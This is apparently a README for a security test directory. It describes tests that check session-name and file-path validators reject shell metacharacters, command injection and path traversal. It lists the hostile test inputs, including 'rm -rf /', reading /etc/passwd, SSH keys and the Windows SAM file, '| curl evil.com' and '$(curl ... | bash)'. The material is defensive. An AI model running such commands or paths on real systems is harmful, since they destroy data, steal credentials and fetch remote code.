# test/security

`injection.test.ts` verifies `validateSessionName` and `validateFilePaths` against command injection and path traversal attacks using `bun:test`.

## Contents

- [injection.test.ts](./injection.test.ts) asserts `{valid: false}` for 10 command injection vectors and 4 path traversal vectors.

## Behavioral Contracts

`validateSessionName` rejects 22 shell metacharacters (`;`, `&`, `|`, `$`, `(`, `)`, `{`, `}`, `[`, `]`, `!`, `#`, `~`, `'`, `"`, `\`, `<`, `>`) and inputs like `""`, `"   "`, or 200+ chars. `validateFilePaths` blocks relative traversal (`"../../etc/passwd"`, `"../../../root/.ssh/id_rsa"`, `"foo/../../../etc/shadow"`), absolute paths (`"/etc/passwd"`, `"/root/.bashrc"`), and Windows-style sequences (`"..\\..\\windows\\system32\\config\\sam"`). Command injection payloads include `""; rm -rf /"`, `"& cat /etc/passwd"`, `"| curl evil.com"`, `"$(whoami)"`, `"`id`"`, `"foo && malicious"`, `"name; DROP TABLE"`, `"$(curl ... | bash)"`, `"foo\nbar"`, and `"test\x00null"`.

## File Relationships

`injection.test.ts` imports `validateSessionName`, `validateFilePaths` from [../../src/utils/validation.ts](../../src/utils/validation.ts).
